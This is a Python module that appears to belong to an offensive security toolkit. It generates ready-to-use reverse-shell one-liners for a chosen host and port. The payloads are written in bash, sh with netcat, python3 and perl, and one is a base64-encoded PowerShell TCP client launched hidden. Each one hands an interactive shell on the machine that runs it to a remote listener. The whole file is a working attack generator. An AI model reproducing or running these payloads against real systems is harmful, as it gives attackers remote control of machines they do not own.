import base64, rclib
def run(ctx):
    lhost = ctx.target or "10.10.10.10"
    lport = getattr(ctx.args, "port", None) or "4444"
    ctx.info(f"reverse-shell payloads for {lhost}:{lport}")
    ps = f"$c=New-Object System.Net.Sockets.TCPClient('{lhost}',{lport});$s=$c.GetStream();[byte[]]$b=0..65535|%{{0}};while(($i=$s.Read($b,0,$b.Length)) -ne 0){{$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$s2=$r+'PS '+(pwd).Path+'> ';$sb=([Text.Encoding]::ASCII).GetBytes($s2);$s.Write($sb,0,$sb.Length);$s.Flush()}}"
    payloads = {
      "bash":       f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
      "sh (nc)":    f"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {lhost} {lport} >/tmp/f",
      "python3":    f"python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{lhost}\",{lport}));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn(\"/bin/bash\")'",
      "powershell": f"powershell -nop -w hidden -e {base64.b64encode(ps.encode('utf-16-le')).decode()}",
      "perl":       f"perl -e 'use Socket;$i=\"{lhost}\";$p={lport};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
    }
    for k,v in payloads.items():
        print(f"\n# {k}\n{v}")
    ctx.data["payloads"] = payloads
    ctx.finding(f"generated {len(payloads)} reverse-shell payloads", "info", host=lhost, port=lport)
    return 0
def args(p): p.add_argument("--port", help="listener port (default 4444)")
rclib.main("shellcode-gen", "Reverse-shell / stager one-liner generator", run, extra_args=args, needs_target=False)
